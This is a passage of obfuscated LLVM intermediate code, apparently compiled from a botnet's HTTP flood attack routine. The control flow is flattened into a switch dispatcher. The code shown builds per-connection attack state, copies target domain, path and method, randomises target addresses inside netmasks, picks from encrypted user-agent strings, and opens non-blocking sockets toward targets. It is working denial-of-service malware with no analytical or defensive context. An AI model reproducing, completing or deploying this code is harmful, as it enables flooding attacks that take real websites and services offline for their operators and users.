    i32 -308411896, label %1997
    i32 -1355761829, label %2006
    i32 150931538, label %2019
    i32 1074849915, label %2030
    i32 -54115935, label %2031
    i32 -1826613185, label %2032
    i32 -832333970, label %2039
    i32 -949926251, label %2048
    i32 1426456844, label %2061
    i32 1825813390, label %2072
    i32 1730447103, label %2073
    i32 1308316347, label %2074
    i32 -1376349795, label %2075
    i32 -751736116, label %2082
    i32 -709784769, label %2083
    i32 1522297801, label %2084
    i32 -852491659, label %2095
    i32 718673740, label %2103
    i32 -1771332067, label %2106
    i32 -675185851, label %2111
    i32 95030122, label %2114
    i32 1836896413, label %2117
    i32 2001234707, label %2118
    i32 -959065545, label %2127
    i32 -462720326, label %2134
    i32 368647132, label %2135
    i32 939276051, label %2142
    i32 912473565, label %2143
    i32 1659010339, label %2149
    i32 1182151728, label %2161
    i32 701958788, label %2184
    i32 602096038, label %2186
    i32 -1557909494, label %2190
    i32 598778811, label %2195
    i32 201677498, label %2200
    i32 -79504362, label %2209
    i32 -1647387243, label %2210
    i32 -1746132042, label %2219
    i32 796688276, label %2225
    i32 -714082173, label %2234
    i32 -487071792, label %2238
    i32 515340712, label %2242
    i32 -1001317966, label %2253
    i32 1841573069, label %2264
    i32 2092779269, label %2297
    i32 149945825, label %2306
    i32 -1377008516, label %2393
    i32 688105166, label %2398
    i32 1119460215, label %2399
    i32 -1857307076, label %2400
    i32 -1429358002, label %2406
    i32 1830716276, label %2412
    i32 935819184, label %2422
    i32 337011209, label %2443
    i32 510982773, label %2453
    i32 1956271007, label %2461
    i32 -619776329, label %2464
    i32 -810546594, label %2470
    i32 -1783149299, label %2471
    i32 1140671727, label %2484
    i32 -1985023134, label %2487
    i32 -1330735938, label %2488
    i32 -1687880589, label %2489
    i32 -1212029393, label %2493
    i32 -1111277901, label %2494
    i32 -1753786616, label %2525
    i32 -635243065, label %2526
    i32 -1239045360, label %2527
    i32 123137081, label %2528
    i32 -726301654, label %2529
    i32 710233807, label %2530
    i32 -106721809, label %2537
    i32 1009481657, label %2538
    i32 1495337038, label %2549
    i32 -568895287, label %2551
    i32 -1030918469, label %2555
    i32 -1815768319, label %2560
    i32 -809476616, label %2565
    i32 198473311, label %2574
    i32 1130425240, label %2575
    i32 1289748546, label %2576
    i32 1458701809, label %2583
    i32 -1673706629, label %2586
    i32 -549944157, label %2587
    i32 -859888446, label %2588
    i32 1725086466, label %2589
    i32 -1410630838, label %2590
    i32 -218755353, label %2591
    i32 -666413566, label %2594
    i32 257456709, label %2595
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

first:                                            ; preds = %loopEntry
  %.reload = load volatile i8*, i8** %.reg2mem
  %85 = icmp eq i8* %.reload, null
  %86 = select i1 %85, i32 980934652, i32 -478137180
  store i32 %86, i32* %switchVar
  br label %loopEnd

; <label>:87:                                     ; preds = %loopEntry
  %88 = load i8*, i8** %17, align 8
  %89 = icmp eq i8* %88, null
  %90 = select i1 %89, i32 980934652, i32 145735943
  store i32 %90, i32* %switchVar
  br label %loopEnd

; <label>:91:                                     ; preds = %loopEntry
  store i32 257456709, i32* %switchVar
  br label %loopEnd

; <label>:92:                                     ; preds = %loopEntry
  %93 = load i8*, i8** %17, align 8
  %94 = call i32 @util_strlen(i8* %93)
  %95 = icmp sgt i32 %94, 255
  %96 = select i1 %95, i32 412267868, i32 500956462
  store i32 %96, i32* %switchVar
  br label %loopEnd

; <label>:97:                                     ; preds = %loopEntry
  store i32 257456709, i32* %switchVar
  br label %loopEnd

; <label>:98:                                     ; preds = %loopEntry
  %99 = load i8*, i8** %16, align 8
  %100 = call i32 @util_strlen(i8* %99)
  %101 = icmp sgt i32 %100, 127
  %102 = select i1 %101, i32 -59348031, i32 -1631250798
  store i32 %102, i32* %switchVar
  br label %loopEnd

; <label>:103:                                    ; preds = %loopEntry
  store i32 257456709, i32* %switchVar
  br label %loopEnd

; <label>:104:                                    ; preds = %loopEntry
  %105 = load i8*, i8** %15, align 8
  %106 = call i32 @util_strlen(i8* %105)
  %107 = icmp sgt i32 %106, 9
  %108 = select i1 %107, i32 179748305, i32 -1516606543
  store i32 %108, i32* %switchVar
  br label %loopEnd

; <label>:109:                                    ; preds = %loopEntry
  store i32 257456709, i32* %switchVar
  br label %loopEnd

; <label>:110:                                    ; preds = %loopEntry
  store i32 0, i32* %10, align 4
  store i32 -386428022, i32* %switchVar
  br label %loopEnd

; <label>:111:                                    ; preds = %loopEntry
  %112 = load i32, i32* %10, align 4
  %113 = load i8*, i8** %15, align 8
  %114 = call i32 @util_strlen(i8* %113)
  %115 = icmp slt i32 %112, %114
  %116 = select i1 %115, i32 -1474356353, i32 -286873282
  store i32 %116, i32* %switchVar
  br label %loopEnd

; <label>:117:                                    ; preds = %loopEntry
  %118 = load i8*, i8** %15, align 8
  %119 = load i32, i32* %10, align 4
  %120 = sext i32 %119 to i64
  %121 = getelementptr inbounds i8, i8* %118, i64 %120
  %122 = load i8, i8* %121, align 1
  %123 = sext i8 %122 to i32
  %124 = icmp sge i32 %123, 97
  %125 = select i1 %124, i32 506307985, i32 557104655
  store i32 %125, i32* %switchVar
  br label %loopEnd

; <label>:126:                                    ; preds = %loopEntry
  %127 = load i8*, i8** %15, align 8
  %128 = load i32, i32* %10, align 4
  %129 = sext i32 %128 to i64
  %130 = getelementptr inbounds i8, i8* %127, i64 %129
  %131 = load i8, i8* %130, align 1
  %132 = sext i8 %131 to i32
  %133 = icmp sle i32 %132, 122
  %134 = select i1 %133, i32 -1930097074, i32 557104655
  store i32 %134, i32* %switchVar
  br label %loopEnd

; <label>:135:                                    ; preds = %loopEntry
  %136 = load i8*, i8** %15, align 8
  %137 = load i32, i32* %10, align 4
  %138 = sext i32 %137 to i64
  %139 = getelementptr inbounds i8, i8* %136, i64 %138
  %140 = load i8, i8* %139, align 1
  %141 = sext i8 %140 to i32
  %142 = sub nsw i32 %141, 32
  %143 = trunc i32 %142 to i8
  store i8 %143, i8* %139, align 1
  store i32 557104655, i32* %switchVar
  br label %loopEnd

; <label>:144:                                    ; preds = %loopEntry
  store i32 159581536, i32* %switchVar
  br label %loopEnd

; <label>:145:                                    ; preds = %loopEntry
  %146 = load i32, i32* %10, align 4
  %147 = add nsw i32 %146, 1
  store i32 %147, i32* %10, align 4
  store i32 -386428022, i32* %switchVar
  br label %loopEnd

; <label>:148:                                    ; preds = %loopEntry
  %149 = load i32, i32* %18, align 4
  %150 = icmp sgt i32 %149, 256
  %151 = select i1 %150, i32 690238073, i32 661783787
  store i32 %151, i32* %switchVar
  br label %loopEnd

; <label>:152:                                    ; preds = %loopEntry
  store i32 256, i32* %18, align 4
  store i32 661783787, i32* %switchVar
  br label %loopEnd

; <label>:153:                                    ; preds = %loopEntry
  call void @table_unlock_val(i8 zeroext 52)
  call void @table_unlock_val(i8 zeroext 53)
  call void @table_unlock_val(i8 zeroext 54)
  call void @table_unlock_val(i8 zeroext 55)
  call void @table_unlock_val(i8 zeroext 56)
  call void @table_unlock_val(i8 zeroext 57)
  call void @table_unlock_val(i8 zeroext 58)
  call void @table_unlock_val(i8 zeroext 59)
  call void @table_unlock_val(i8 zeroext 60)
  call void @table_unlock_val(i8 zeroext 61)
  call void @table_unlock_val(i8 zeroext 62)
  %154 = load i32, i32* %18, align 4
  %155 = sext i32 %154 to i64
  %156 = call noalias i8* @calloc(i64 %155, i64 3140) #6
  %157 = bitcast i8* %156 to %struct.attack_http_state*
  store %struct.attack_http_state* %157, %struct.attack_http_state** %13, align 8
  store i32 0, i32* %9, align 4
  store i32 -692796122, i32* %switchVar
  br label %loopEnd

; <label>:158:                                    ; preds = %loopEntry
  %159 = load i32, i32* %9, align 4
  %160 = load i32, i32* %18, align 4
  %161 = icmp slt i32 %159, %160
  %162 = select i1 %161, i32 174999366, i32 1426608168
  store i32 %162, i32* %switchVar
  br label %loopEnd

; <label>:163:                                    ; preds = %loopEntry
  %164 = load %struct.attack_http_state*, %struct.attack_http_state** %13, align 8
  %165 = load i32, i32* %9, align 4
  %166 = sext i32 %165 to i64
  %167 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %164, i64 %166
  %168 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %167, i32 0, i32 1
  store i8 0, i8* %168, align 4
  %169 = load %struct.attack_http_state*, %struct.attack_http_state** %13, align 8
  %170 = load i32, i32* %9, align 4
  %171 = sext i32 %170 to i64
  %172 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %169, i64 %171
  %173 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %172, i32 0, i32 0
  store i32 -1, i32* %173, align 4
  %174 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %175 = load i32, i32* %9, align 4
  %176 = load i8, i8* %5, align 1
  %177 = zext i8 %176 to i32
  %178 = srem i32 %175, %177
  %179 = sext i32 %178 to i64
  %180 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %174, i64 %179
  %181 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %180, i32 0, i32 1
  %182 = load i32, i32* %181, align 4
  %183 = load %struct.attack_http_state*, %struct.attack_http_state** %13, align 8
  %184 = load i32, i32* %9, align 4
  %185 = sext i32 %184 to i64
  %186 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %183, i64 %185
  %187 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %186, i32 0, i32 4
  store i32 %182, i32* %187, align 4
  %188 = load %struct.attack_http_state*, %struct.attack_http_state** %13, align 8
  %189 = load i32, i32* %9, align 4
  %190 = sext i32 %189 to i64
  %191 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %188, i64 %190
  %192 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %191, i32 0, i32 6
  %193 = getelementptr inbounds [257 x i8], [257 x i8]* %192, i32 0, i32 0
  %194 = load i8*, i8** %17, align 8
  %195 = call i32 @util_strcpy(i8* %193, i8* %194)
  %196 = load %struct.attack_http_state*, %struct.attack_http_state** %13, align 8
  %197 = load i32, i32* %9, align 4
  %198 = sext i32 %197 to i64
  %199 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %196, i64 %198
  %200 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %199, i32 0, i32 6
  %201 = getelementptr inbounds [257 x i8], [257 x i8]* %200, i64 0, i64 0
  %202 = load i8, i8* %201, align 4
  %203 = sext i8 %202 to i32
  %204 = icmp ne i32 %203, 47
  %205 = select i1 %204, i32 -803479457, i32 1553598366
  store i32 %205, i32* %switchVar
  br label %loopEnd

; <label>:206:                                    ; preds = %loopEntry
  %207 = load %struct.attack_http_state*, %struct.attack_http_state** %13, align 8
  %208 = load i32, i32* %9, align 4
  %209 = sext i32 %208 to i64
  %210 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %207, i64 %209
  %211 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %210, i32 0, i32 6
  %212 = getelementptr inbounds [257 x i8], [257 x i8]* %211, i32 0, i32 0
  %213 = getelementptr inbounds i8, i8* %212, i64 1
  %214 = load %struct.attack_http_state*, %struct.attack_http_state** %13, align 8
  %215 = load i32, i32* %9, align 4
  %216 = sext i32 %215 to i64
  %217 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %214, i64 %216
  %218 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %217, i32 0, i32 6
  %219 = getelementptr inbounds [257 x i8], [257 x i8]* %218, i32 0, i32 0
  %220 = load %struct.attack_http_state*, %struct.attack_http_state** %13, align 8
  %221 = load i32, i32* %9, align 4
  %222 = sext i32 %221 to i64
  %223 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %220, i64 %222
  %224 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %223, i32 0, i32 6
  %225 = getelementptr inbounds [257 x i8], [257 x i8]* %224, i32 0, i32 0
  %226 = call i32 @util_strlen(i8* %225)
  %227 = sext i32 %226 to i64
  call void @llvm.memmove.p0i8.p0i8.i64(i8* %213, i8* %219, i64 %227, i32 1, i1 false)
  %228 = load %struct.attack_http_state*, %struct.attack_http_state** %13, align 8
  %229 = load i32, i32* %9, align 4
  %230 = sext i32 %229 to i64
  %231 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %228, i64 %230
  %232 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %231, i32 0, i32 6
  %233 = getelementptr inbounds [257 x i8], [257 x i8]* %232, i64 0, i64 0
  store i8 47, i8* %233, align 4
  store i32 1553598366, i32* %switchVar
  br label %loopEnd

; <label>:234:                                    ; preds = %loopEntry
  %235 = load %struct.attack_http_state*, %struct.attack_http_state** %13, align 8
  %236 = load i32, i32* %9, align 4
  %237 = sext i32 %236 to i64
  %238 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %235, i64 %237
  %239 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %238, i32 0, i32 10
  %240 = getelementptr inbounds [9 x i8], [9 x i8]* %239, i32 0, i32 0
  %241 = load i8*, i8** %15, align 8
  %242 = call i32 @util_strcpy(i8* %240, i8* %241)
  %243 = load %struct.attack_http_state*, %struct.attack_http_state** %13, align 8
  %244 = load i32, i32* %9, align 4
  %245 = sext i32 %244 to i64
  %246 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %243, i64 %245
  %247 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %246, i32 0, i32 9
  %248 = getelementptr inbounds [9 x i8], [9 x i8]* %247, i32 0, i32 0
  %249 = load i8*, i8** %15, align 8
  %250 = call i32 @util_strcpy(i8* %248, i8* %249)
  %251 = load %struct.attack_http_state*, %struct.attack_http_state** %13, align 8
  %252 = load i32, i32* %9, align 4
  %253 = sext i32 %252 to i64
  %254 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %251, i64 %253
  %255 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %254, i32 0, i32 7
  %256 = getelementptr inbounds [129 x i8], [129 x i8]* %255, i32 0, i32 0
  %257 = load i8*, i8** %16, align 8
  %258 = call i32 @util_strcpy(i8* %256, i8* %257)
  %259 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %260 = load i32, i32* %9, align 4
  %261 = load i8, i8* %5, align 1
  %262 = zext i8 %261 to i32
  %263 = srem i32 %260, %262
  %264 = sext i32 %263 to i64
  %265 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %259, i64 %264
  %266 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %265, i32 0, i32 2
  %267 = load i8, i8* %266, align 4
  %268 = zext i8 %267 to i32
  %269 = icmp slt i32 %268, 32
  %270 = select i1 %269, i32 1125950080, i32 38019215
  store i32 %270, i32* %switchVar
  br label %loopEnd

; <label>:271:                                    ; preds = %loopEntry
  %272 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %273 = load i32, i32* %9, align 4
  %274 = load i8, i8* %5, align 1
  %275 = zext i8 %274 to i32
  %276 = srem i32 %273, %275
  %277 = sext i32 %276 to i64
  %278 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %272, i64 %277
  %279 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %278, i32 0, i32 1
  %280 = load i32, i32* %279, align 4
  %281 = call i32 @ntohl(i32 %280) #7
  %282 = call i32 @rand_next()
  %283 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %284 = load i32, i32* %9, align 4
  %285 = load i8, i8* %5, align 1
  %286 = zext i8 %285 to i32
  %287 = srem i32 %284, %286
  %288 = sext i32 %287 to i64
  %289 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %283, i64 %288
  %290 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %289, i32 0, i32 2
  %291 = load i8, i8* %290, align 4
  %292 = zext i8 %291 to i32
  %293 = lshr i32 %282, %292
  %294 = add i32 %281, %293
  %295 = call i32 @htonl(i32 %294) #7
  %296 = load %struct.attack_http_state*, %struct.attack_http_state** %13, align 8
  %297 = load i32, i32* %9, align 4
  %298 = sext i32 %297 to i64
  %299 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %296, i64 %298
  %300 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %299, i32 0, i32 4
  store i32 %295, i32* %300, align 4
  store i32 38019215, i32* %switchVar
  br label %loopEnd

; <label>:301:                                    ; preds = %loopEntry
  %302 = call i32 @rand_next()
  %303 = urem i32 %302, 5
  store i32 %303, i32* %.reg2mem10
  store i32 -1313146943, i32* %switchVar
  br label %loopEnd

NodeBlock7:                                       ; preds = %loopEntry
  %.reload16 = load volatile i32, i32* %.reg2mem10
  %Pivot8 = icmp slt i32 %.reload16, 2
  %304 = select i1 %Pivot8, i32 1851843660, i32 866208778
  store i32 %304, i32* %switchVar
  br label %loopEnd

NodeBlock5:                                       ; preds = %loopEntry
  %.reload13 = load volatile i32, i32* %.reg2mem10
  %Pivot6 = icmp slt i32 %.reload13, 3
  %305 = select i1 %Pivot6, i32 1347609670, i32 1259942162
  store i32 %305, i32* %switchVar
  br label %loopEnd

NodeBlock3:                                       ; preds = %loopEntry
  %.reload12 = load volatile i32, i32* %.reg2mem10
  %Pivot4 = icmp slt i32 %.reload12, 4
  %306 = select i1 %Pivot4, i32 -233416032, i32 -27125335
  store i32 %306, i32* %switchVar
  br label %loopEnd

LeafBlock1:                                       ; preds = %loopEntry
  %.reload11 = load volatile i32, i32* %.reg2mem10
  %SwitchLeaf2 = icmp eq i32 %.reload11, 4
  %307 = select i1 %SwitchLeaf2, i32 116841844, i32 -292837491
  store i32 %307, i32* %switchVar
  br label %loopEnd

NodeBlock:                                        ; preds = %loopEntry
  %.reload15 = load volatile i32, i32* %.reg2mem10
  %Pivot = icmp slt i32 %.reload15, 1
  %308 = select i1 %Pivot, i32 -1956632471, i32 -1605939562
  store i32 %308, i32* %switchVar
  br label %loopEnd

LeafBlock:                                        ; preds = %loopEntry
  %.reload14 = load volatile i32, i32* %.reg2mem10
  %SwitchLeaf = icmp eq i32 %.reload14, 0
  %309 = select i1 %SwitchLeaf, i32 -695033282, i32 -292837491
  store i32 %309, i32* %switchVar
  br label %loopEnd

; <label>:310:                                    ; preds = %loopEntry
  call void @table_unlock_val(i8 zeroext 63)
  %311 = load %struct.attack_http_state*, %struct.attack_http_state** %13, align 8
  %312 = load i32, i32* %9, align 4
  %313 = sext i32 %312 to i64
  %314 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %311, i64 %313
  %315 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %314, i32 0, i32 5
  %316 = getelementptr inbounds [512 x i8], [512 x i8]* %315, i32 0, i32 0
  %317 = call i8* @table_retrieve_val(i32 63, i32* null)
  %318 = call i32 @util_strcpy(i8* %316, i8* %317)
  call void @table_lock_val(i8 zeroext 63)
  store i32 -1240872668, i32* %switchVar
  br label %loopEnd

; <label>:319:                                    ; preds = %loopEntry
  call void @table_unlock_val(i8 zeroext 64)
  %320 = load %struct.attack_http_state*, %struct.attack_http_state** %13, align 8
  %321 = load i32, i32* %9, align 4
  %322 = sext i32 %321 to i64
  %323 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %320, i64 %322
  %324 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %323, i32 0, i32 5
  %325 = getelementptr inbounds [512 x i8], [512 x i8]* %324, i32 0, i32 0
  %326 = call i8* @table_retrieve_val(i32 64, i32* null)
  %327 = call i32 @util_strcpy(i8* %325, i8* %326)
  call void @table_lock_val(i8 zeroext 64)
  store i32 -1240872668, i32* %switchVar
  br label %loopEnd

; <label>:328:                                    ; preds = %loopEntry
  call void @table_unlock_val(i8 zeroext 65)
  %329 = load %struct.attack_http_state*, %struct.attack_http_state** %13, align 8
  %330 = load i32, i32* %9, align 4
  %331 = sext i32 %330 to i64
  %332 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %329, i64 %331
  %333 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %332, i32 0, i32 5
  %334 = getelementptr inbounds [512 x i8], [512 x i8]* %333, i32 0, i32 0
  %335 = call i8* @table_retrieve_val(i32 65, i32* null)
  %336 = call i32 @util_strcpy(i8* %334, i8* %335)
  call void @table_lock_val(i8 zeroext 65)
  store i32 -1240872668, i32* %switchVar
  br label %loopEnd

; <label>:337:                                    ; preds = %loopEntry
  call void @table_unlock_val(i8 zeroext 66)
  %338 = load %struct.attack_http_state*, %struct.attack_http_state** %13, align 8
  %339 = load i32, i32* %9, align 4
  %340 = sext i32 %339 to i64
  %341 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %338, i64 %340
  %342 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %341, i32 0, i32 5
  %343 = getelementptr inbounds [512 x i8], [512 x i8]* %342, i32 0, i32 0
  %344 = call i8* @table_retrieve_val(i32 66, i32* null)
  %345 = call i32 @util_strcpy(i8* %343, i8* %344)
  call void @table_lock_val(i8 zeroext 66)
  store i32 -1240872668, i32* %switchVar
  br label %loopEnd

; <label>:346:                                    ; preds = %loopEntry
  call void @table_unlock_val(i8 zeroext 67)
  %347 = load %struct.attack_http_state*, %struct.attack_http_state** %13, align 8
  %348 = load i32, i32* %9, align 4
  %349 = sext i32 %348 to i64
  %350 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %347, i64 %349
  %351 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %350, i32 0, i32 5
  %352 = getelementptr inbounds [512 x i8], [512 x i8]* %351, i32 0, i32 0
  %353 = call i8* @table_retrieve_val(i32 67, i32* null)
  %354 = call i32 @util_strcpy(i8* %352, i8* %353)
  call void @table_lock_val(i8 zeroext 67)
  store i32 -1240872668, i32* %switchVar
  br label %loopEnd

NewDefault:                                       ; preds = %loopEntry
  store i32 -1240872668, i32* %switchVar
  br label %loopEnd

; <label>:355:                                    ; preds = %loopEntry
  %356 = load %struct.attack_http_state*, %struct.attack_http_state** %13, align 8
  %357 = load i32, i32* %9, align 4
  %358 = sext i32 %357 to i64
  %359 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %356, i64 %358
  %360 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %359, i32 0, i32 6
  %361 = getelementptr inbounds [257 x i8], [257 x i8]* %360, i32 0, i32 0
  %362 = load i8*, i8** %17, align 8
  %363 = call i32 @util_strcpy(i8* %361, i8* %362)
  store i32 1408442000, i32* %switchVar
  br label %loopEnd

; <label>:364:                                    ; preds = %loopEntry
  %365 = load i32, i32* %9, align 4
  %366 = add nsw i32 %365, 1
  store i32 %366, i32* %9, align 4
  store i32 -692796122, i32* %switchVar
  br label %loopEnd

; <label>:367:                                    ; preds = %loopEntry
  store i32 -728621910, i32* %switchVar
  br label %loopEnd

; <label>:368:                                    ; preds = %loopEntry
  store i32 0, i32* %23, align 4
  %369 = call i64 @time(i64* null) #6
  %370 = trunc i64 %369 to i32
  store i32 %370, i32* %27, align 4
  store i32 -1175196367, i32* %switchVar
  br label %loopEnd

; <label>:371:                                    ; preds = %loopEntry
  %372 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %21, i32 0, i32 0
  %373 = getelementptr inbounds [16 x i64], [16 x i64]* %372, i64 0, i64 0
  %374 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* %373) #6, !srcloc !1
  %375 = extractvalue { i64, i64* } %374, 0
  %376 = extractvalue { i64, i64* } %374, 1
  %377 = trunc i64 %375 to i32
  store i32 %377, i32* %28, align 4
  %378 = ptrtoint i64* %376 to i64
  %379 = trunc i64 %378 to i32
  store i32 %379, i32* %29, align 4
  store i32 -41068445, i32* %switchVar
  br label %loopEnd

; <label>:380:                                    ; preds = %loopEntry
  store i32 -720427335, i32* %switchVar
  br label %loopEnd

; <label>:381:                                    ; preds = %loopEntry
  %382 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %22, i32 0, i32 0
  %383 = getelementptr inbounds [16 x i64], [16 x i64]* %382, i64 0, i64 0
  %384 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* %383) #6, !srcloc !2
  %385 = extractvalue { i64, i64* } %384, 0
  %386 = extractvalue { i64, i64* } %384, 1
  %387 = trunc i64 %385 to i32
  store i32 %387, i32* %30, align 4
  %388 = ptrtoint i64* %386 to i64
  %389 = trunc i64 %388 to i32
  store i32 %389, i32* %31, align 4
  store i32 -2056683923, i32* %switchVar
  br label %loopEnd

; <label>:390:                                    ; preds = %loopEntry
  store i32 0, i32* %9, align 4
  store i32 -120314153, i32* %switchVar
  br label %loopEnd

; <label>:391:                                    ; preds = %loopEntry
  %392 = load i32, i32* %9, align 4
  %393 = load i32, i32* %18, align 4
  %394 = icmp slt i32 %392, %393
  %395 = select i1 %394, i32 -388224184, i32 -15721029
  store i32 %395, i32* %switchVar
  br label %loopEnd

; <label>:396:                                    ; preds = %loopEntry
  %397 = load %struct.attack_http_state*, %struct.attack_http_state** %13, align 8
  %398 = load i32, i32* %9, align 4
  %399 = sext i32 %398 to i64
  %400 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %397, i64 %399
  store %struct.attack_http_state* %400, %struct.attack_http_state** %26, align 8
  %401 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %402 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %401, i32 0, i32 1
  %403 = load i8, i8* %402, align 4
  %404 = zext i8 %403 to i32
  %405 = icmp eq i32 %404, 1
  %406 = select i1 %405, i32 -2033892053, i32 814253623
  store i32 %406, i32* %switchVar
  br label %loopEnd

; <label>:407:                                    ; preds = %loopEntry
  %408 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %409 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %408, i32 0, i32 12
  %410 = load i32, i32* %409, align 4
  %411 = icmp ne i32 %410, 0
  %412 = select i1 %411, i32 1552742507, i32 -1208276379
  store i32 %412, i32* %switchVar
  br label %loopEnd

; <label>:413:                                    ; preds = %loopEntry
  %414 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %415 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %414, i32 0, i32 1
  store i8 4, i8* %415, align 4
  store i32 608866941, i32* %switchVar
  br label %loopEnd

; <label>:416:                                    ; preds = %loopEntry
  %417 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %418 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %417, i32 0, i32 1
  store i8 0, i8* %418, align 4
  store i32 608866941, i32* %switchVar
  br label %loopEnd

; <label>:419:                                    ; preds = %loopEntry
  store i32 814253623, i32* %switchVar
  br label %loopEnd

; <label>:420:                                    ; preds = %loopEntry
  %421 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %422 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %421, i32 0, i32 1
  %423 = load i8, i8* %422, align 4
  %424 = zext i8 %423 to i32
  %425 = icmp eq i32 %424, 0
  %426 = select i1 %425, i32 -460699051, i32 53573558
  store i32 %426, i32* %switchVar
  br label %loopEnd

; <label>:427:                                    ; preds = %loopEntry
  %428 = bitcast %struct.sockaddr_in* %32 to i8*
  call void @llvm.memset.p0i8.i64(i8* %428, i8 0, i64 16, i32 4, i1 false)
  %429 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %430 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %429, i32 0, i32 0
  %431 = load i32, i32* %430, align 4
  %432 = icmp ne i32 %431, -1
  %433 = select i1 %432, i32 -253731804, i32 1573764332
  store i32 %433, i32* %switchVar
  br label %loopEnd

; <label>:434:                                    ; preds = %loopEntry
  %435 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %436 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %435, i32 0, i32 0
  %437 = load i32, i32* %436, align 4
  %438 = call i32 @close(i32 %437)
  store i32 1573764332, i32* %switchVar
  br label %loopEnd

; <label>:439:                                    ; preds = %loopEntry
  %440 = call i32 @socket(i32 2, i32 1, i32 0) #6
  %441 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %442 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %441, i32 0, i32 0
  store i32 %440, i32* %442, align 4
  %443 = icmp eq i32 %440, -1
  %444 = select i1 %443, i32 -1688547935, i32 574287833
  store i32 %444, i32* %switchVar
  br label %loopEnd

; <label>:445:                                    ; preds = %loopEntry
  store i32 792116999, i32* %switchVar
  br label %loopEnd

; <label>:446:                                    ; preds = %loopEntry
  %447 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %448 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %447, i32 0, i32 0
  %449 = load i32, i32* %448, align 4
  %450 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %451 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %450, i32 0, i32 0
  %452 = load i32, i32* %451, align 4
  %453 = call i32 (i32, i32, ...) @fcntl(i32 %452, i32 3, i32 0)
  %454 = or i32 2048, %453
  %455 = call i32 (i32, i32, ...) @fcntl(i32 %449, i32 4, i32 %454)
  store i32 65535, i32* %10, align 4
  %456 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %457 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %456, i32 0, i32 0
  %458 = load i32, i32* %457, align 4
  %459 = bitcast i32* %10 to i8*
